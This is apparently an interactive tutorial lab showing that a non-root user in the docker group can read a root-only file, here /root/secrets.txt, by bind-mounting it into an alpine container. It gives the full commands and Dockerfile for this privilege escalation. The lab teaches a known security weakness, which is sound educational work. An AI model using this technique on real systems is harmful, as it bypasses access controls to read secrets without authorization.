Let's write a super secret message in a file that only root can read:

`echo "top secret secret" >> /root/secrets.txt`{{execute}}

`chmod 0600 /root/secrets.txt`{{execute}}


Now, we're going to try to read it as a non-root user:

`ls -l /root/secrets.txt`{{execute}} 

`su - mindundi`{{execute}} 

`cat /root/secrets.txt`{{execute}} 

Ops, seems that we can't read it, but our user `mindundi` can use docker right?

`id`{{execute}}
`docker ps`{{execute}}

Okey, so let's build a simple docker image:

<pre class="file" data-filename="/home/mindundi/Dockerfile" data-target="replace">
FROM alpine:3.7
CMD ["cat", "/tmp/secrets.txt"]
</pre>

`docker build -t ourimage .`{{execute}} 

`docker run -v /root/secrets.txt:/tmp/secrets.txt ourimage`{{execute}} 

BOOM! We're accessing a file owned by root with a non-root user.